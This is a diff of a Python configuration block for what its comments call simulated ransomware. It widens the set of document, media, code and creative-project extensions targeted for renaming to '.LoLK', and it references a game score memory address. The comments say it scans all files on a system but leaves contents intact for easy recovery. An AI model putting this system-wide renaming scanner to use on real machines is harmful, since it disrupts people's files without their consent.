@@ -15,22 +15,26 @@ SCORE_ADDRESS = 0x004E40BC # This is the memory address where the score is store
 TARGET_EXTENSION = ".LoLK" # This is the extension that will be appended to files to simulate encryption. When the program "encrypts" a file, it will rename the file to have this extension. For example, "document.pdf" would be renamed to "document.pdf.LoLK". This allows for easy recovery by simply removing the ".LoLK" extension from the file name.
 FILE_EXTENSIONS_NEED_TO_RENAME = {
     ".pdf", ".txt", ".md", ".json", ".doc", ".docx", ".odt", ".wps",
-    ".ppt", ".pptx", ".xls", ".xlsx", "csv", ".tsv", ".sql", ".db", ".mdb", ".accdb", "odp", "ods",
+    ".ppt", ".pptx", ".xls", ".xlsx", ".csv", ".tsv", ".sql", ".db", ".mdb", ".accdb", ".odp", ".ods",
     ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".svg",
-    ".mp3", ".m4a", ".aac", ".flac", ".alac", ".wav", ".mid", "ogg", "opus", "aiff", "wma", "ape",
-    ".mp4", ".mov", ".mkv", ".flv", "avi", "wmv", "mpeg", "flv",
-    ".zip", ".rar", "7z", ".tar", ".gz", ".bz2", "iso",
-    ".py",".cpp", ".h", ".java", ".js", ".html", ".css", ".cs", ".go", ".rb", ".php", "swift", ".kt", ".rs",
+    ".mp3", ".m4a", ".aac", ".flac", ".alac", ".wav", ".mid", ".ogg", ".opus", ".aiff", ".wma", ".ape",
+    ".mp4", ".mov", ".mkv", ".flv", ".avi", ".wmv", ".mpeg",
+    ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".iso",
+    ".cpp", ".h", ".java", ".js", ".html", ".css", ".cs", ".go", ".rb", ".php", ".swift", ".kt", ".rs",
     ".psd", ".ai", ".indd", ".sketch", ".blend", ".fbx", ".obj", ".dwg", ".dxf", ".3ds", ".max",
+    ".pmm", ".pmmx", ".pmmz", ".pmm3d", ".pmm2d", ".pmmproj", ".pmmtemplate", ".pmmbackup", ".pmx",
+    ".cpr", ".song", ".dawproject", ".flp", ".als", ".logicx", ".ptf", ".ptf2", ".ptf3", ".ptf4", ".ptf5", ".ptf6", ".ptf7", ".mscz", ".sib", ".notion", ".dorico", ".npr", ".nprproj", ".nprbackup", ".nprtemplate", ".nprarchive", ".vpr", ".ustx",
 
     ".PDF", ".TXT", ".MD", ".JSON", ".DOC", ".DOCX", ".ODT", ".WPS",
-    ".PPT", ".PPTX", ".XLS", ".XLSX", "CSV", ".TSV", ".SQL", ".DB", ".MDB", ".ACCDB", "ODP", "ODS",
+    ".PPT", ".PPTX", ".XLS", ".XLSX", ".CSV", ".TSV", ".SQL", ".DB", ".MDB", ".ACCDB", ".ODP", ".ODS",
     ".JPG", ".JPEG", ".PNG", ".BMP", ".GIF", ".SVG",
-    ".MP3", ".M4A", ".AAC", ".FLAC", ".ALAC", ".WAV", ".MID", "OGG", "OPUS", "AIFF", "WMA", "APE",
-    ".MP4", ".MOV", ".MKV", ".FLV", "AVI", ".WMV", ".MPEG", ".FLV",
-    ".ZIP", ".RAR", ".7Z", ".TAR", ".GZ", ".BZ2", "ISO",
-    ".PY",".CPP", ".H", ".JAVA", ".JS", ".HTML", ".CSS", ".CS", ".GO", ".RB", ".PHP", ".SWIFT", ".KT", ".RS",
-    ".PSD", ".AI", ".INDD", ".SKETCH", ".BLEND", ".FBX", ".OBJ", ".DWG", ".DXF", ".3DS", ".MAX"
+    ".MP3", ".M4A", ".AAC", ".FLAC", ".ALAC", ".WAV", ".MID", ".OGG", ".OPUS", ".AIFF", ".WMA", ".APE",
+    ".MP4", ".MOV", ".MKV", ".FLV", ".AVI", ".WMV", ".MPEG",
+    ".ZIP", ".RAR", ".7Z", ".TAR", ".GZ", ".BZ2", ".ISO",
+    ".CPP", ".H", ".JAVA", ".JS", ".HTML", ".CSS", ".CS", ".GO", ".RB", ".PHP", ".SWIFT", ".KT", ".RS",
+    ".PSD", ".AI", ".INDD", ".SKETCH", ".BLEND", ".FBX", ".OBJ", ".DWG", ".DXF", ".3DS", ".MAX",
+    ".PMM", ".PMMX", ".PMMZ", ".PMM3D", ".PMM2D", ".PMMPROJ", ".PMMTEMPLATE", ".PMMBACKUP", ".PMX",
+    ".CPR", ".SONG", ".DAWPROJECT", ".FLP", ".ALS", ".LOGICX", ".PTF", ".PTF2", ".PTF3", ".PTF4", ".PTF5", ".PTF6", ".PTF7", ".MSCZ", ".SIB", ".NOTION", ".DORICO", ".NPR", ".NPRPROJ", ".NPRBACKUP", ".NPRTEMPLATE", ".NPRARCHIVE", ".VPR", ".USTX"
 } # This set contains the file extensions that the program will target for "encryption" (actually just renaming). The program will scan all files on the system and if a file has one of these extensions and is not already "encrypted" (i.e., does not already have the TARGET_EXTENSION), it will rename the file to add the TARGET_EXTENSION. This simulates the effect of encryption without actually modifying the file contents, which allows for easy recovery by simply renaming the files back to their original names. The list includes common document, image, audio, video, archive, code, and design file formats in both lowercase and uppercase to ensure comprehensive coverage.
 # =======================================================
 
